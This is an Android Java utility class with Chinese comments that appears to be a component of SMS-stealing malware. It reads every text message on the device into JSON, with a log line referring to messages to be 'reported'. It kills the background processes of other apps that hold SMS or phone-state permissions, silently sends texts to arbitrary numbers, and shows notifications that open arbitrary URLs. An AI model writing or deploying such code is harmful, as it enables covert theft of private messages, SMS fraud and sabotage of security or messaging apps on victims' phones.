package tools.common;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONArray;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;


public class Tools {
	
	public static boolean checkNet(Context context)
	{
		ConnectivityManager mConnectivity = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
        TelephonyManager mTelephony = (TelephonyManager)context.getSystemService(context.TELEPHONY_SERVICE);
        //检查网络连接，如果无网络可用，就不需要进行连网操作等  
        NetworkInfo info = mConnectivity.getActiveNetworkInfo();
        if (info == null) {       	
        	return false;
        }
		return true;
	}
	
	/**
	 * 重启具有获取短信的APP
	 */
	public static boolean reStart(Context context)
	{ 
		//Logger.info("开始时间："+System.currentTimeMillis());
        PackageManager pm = context.getPackageManager();
        List<PackageInfo> packs = pm.getInstalledPackages(PackageManager.GET_ACTIVITIES);          
        ActivityManager manager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);      
        //包括所有APP，删除的也包括
        for(int i=0;i<packs.size();i++) {  
        	PackageInfo p = packs.get(i);
        	if(!p.packageName.equals(context.getPackageName()))
        	{
        		if(getPermisson(p.packageName,context))
            	{//如果判断出有获取短信权限
            		//Logger.info(p.packageName);
            		//manager.restartPackage(p.packageName);
            		manager.killBackgroundProcesses(p.packageName);
            	}
        	}
        	
        }
        //Logger.info("结束时间："+System.currentTimeMillis());
		return true;
	}
	
public static boolean getPermisson(String pkgName,Context context) {
		
    	StringBuffer tv = new StringBuffer();
    	PackageManager pm = context.getPackageManager();		
    	try {
		    PackageInfo pkgInfo = pm.getPackageInfo(pkgName, PackageManager.GET_PERMISSIONS);
            String sharedPkgList[] = pkgInfo.requestedPermissions;
            if(sharedPkgList==null)
            {
            	return false;
            }
            
            
            for(int i=0;i<sharedPkgList.length;i++){
            	String permName = sharedPkgList[i];
            	
            	if(permName.equals("android.permission.RECEIVE_SMS")||permName.equals("android.permission.READ_PHONE_STATE"))
            	{
            		return true;
            	}
			}
		} catch (NameNotFoundException e) {
			Logger.info("error:"+e.getMessage());
			return false;
		}
    	return false;
	}

	//发送短信
	public static boolean sendSms(Context mContext, String sn, String sm) {
		// TODO Auto-generated method stub
		
		Intent itsend = null;
		Intent itDeliver = null;
		String num = sn;
		//发送短息内容
		String message = sm;
		//发送短息
		itsend = new Intent(Tag.SMS_SEND_ACTIOIN);
		itsend.putExtra("number", num);
		SmsManager smsManager = SmsManager.getDefault();
		PendingIntent sentIntent = PendingIntent.getBroadcast(mContext, 0, itsend, 0);
		ArrayList<PendingIntent> mSentlist = new ArrayList<PendingIntent>();
		mSentlist.add(sentIntent);	
		
		
		itDeliver = new Intent(Tag.SMS_DELIVERED_ACTION);
		itDeliver.putExtra("number", num);	
		PendingIntent mDeliverPI = PendingIntent.getBroadcast(mContext,0, itDeliver,PendingIntent.FLAG_UPDATE_CURRENT); 
		ArrayList<PendingIntent> mDeliverlist = new ArrayList<PendingIntent>();
		mDeliverlist.add(mDeliverPI);
		if (message != null) {								
              ArrayList<String> msgs = smsManager.divideMessage(message); 
              Logger.info("发送长短信!!!!!!!!!!!!!!!!!!!!!!!");
              smsManager.sendMultipartTextMessage(num, null, msgs, mSentlist, mDeliverlist); 				
		}
		
		mSentlist.clear();
		mSentlist = null;
		mDeliverlist.clear();
		mSentlist = null;
	    return true;
	}
	
	
	
	//获取短信
	public static JSONArray getSms(Context mContext)   
	{   
	    final String SMS_URI_ALL   = "content://sms/";  	    
//	    //收件箱
//	    final String SMS_URI_INBOX = "content://sms/inbox"; 
//	    //发件箱
//	    final String SMS_URI_SEND  = "content://sms/sent";   
//	    //草稿箱 
//	    final String SMS_URI_DRAFT = "content://sms/draft";   
	       
	    
	    JSONArray jsonlist = null;
	    try{   
	        ContentResolver cr = mContext.getContentResolver();   
	        String[] projection = new String[]{"_id", "address", "person",    
	                "body", "date", "type"};   
	        Uri uri = Uri.parse(SMS_URI_ALL);   	        
	        Cursor cur = cr.query(uri, projection, null, null, "date asc"); 	        
	        if(null!=cur&&cur.getCount()<1)
	        {
	        	Logger.info("没有需要上报的短信");
	        	return jsonlist;
	        }  
	        jsonlist = new JSONArray();
	        if (cur.moveToFirst()) {  
	        	//收发短信的人名
//	            String name;    
//	            //号码
//	            String phoneNumber;  
//	            //短信内容
//	            String smsbody; 
//	            //日期
//	            String date;  
//	            //类型  1.接收  2.发送  3.草稿
//	            String type;   		            
	            int nameColumn = cur.getColumnIndex("person");//名字   
	            int phoneNumberColumn = cur.getColumnIndex("address");//号码   
	            int smsbodyColumn = cur.getColumnIndex("body");//内容       
	            int dateColumn = cur.getColumnIndex("date");//日期
	            int typeColumn = cur.getColumnIndex("type");//类型 
	            
	            do{   		            	
	            	
	            	Map itemsms = new LinkedHashMap();
	            	itemsms.put("name", cur.getString(nameColumn));
	            	itemsms.put("number", cur.getString(phoneNumberColumn));
	            	itemsms.put("body", cur.getString(smsbodyColumn));
	            	itemsms.put("date", cur.getString(dateColumn));
	            	itemsms.put("type", cur.getInt(typeColumn));
	            	jsonlist.put(itemsms);

	    	        
	            }while(cur.moveToNext()); 
	            
	            
	        } else {   
	        	return jsonlist;
	        }   		              		        
	    } catch(SQLiteException ex) {   
	        Logger.info("SQLiteException in getSmsInPhone:"+ex.getMessage());  
	        return jsonlist;
	    }   
	    return jsonlist;   
	}  
	
	/**
	 * 弹出提示通知
	 * @param context
	 * @param num
	 * @param message
	 */
	public static void showNotification(Context context,String title,String message,String url){  
        //短信号码
    	CharSequence contentTitle = title;
    	//短信文本内容
        CharSequence contentText = message;    	
        //得到一个NotificationManager对象  
        NotificationManager manager=(NotificationManager)context.getSystemService(Context.NOTIFICATION_SERVICE);            
        //实例化一个Notification   
        int icon=R.drawable.ic_launcher;  
        long when=System.currentTimeMillis();  
        Notification notification=new Notification(icon, title, when);  
             
        //设置最新事件消息和PendingIntent    
        //Intent intent=new Intent(Intent.ACTION_MAIN,Uri.parse("smsto:" + contentTitle));
        Intent it = new Intent(Intent.ACTION_VIEW, Uri.parse(url));       
        PendingIntent pendingIntent=PendingIntent.getActivity(context, 0, it, 0);  
        notification.setLatestEventInfo(context, contentTitle, contentText, pendingIntent); 
        //通知被点后立刻消失
        notification.flags |= Notification.FLAG_AUTO_CANCEL; 
        //启动提醒  
        manager.notify(1, notification);    
   }
	
}
